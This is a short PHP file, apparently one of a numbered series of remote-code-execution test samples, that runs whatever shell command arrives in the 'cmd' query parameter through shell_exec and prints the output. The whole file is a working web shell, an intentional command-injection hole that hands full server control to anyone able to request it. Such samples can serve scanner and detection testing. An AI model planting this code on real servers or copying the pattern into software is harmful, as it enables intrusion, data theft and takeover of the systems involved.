<?php
// RCE test variation #19
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>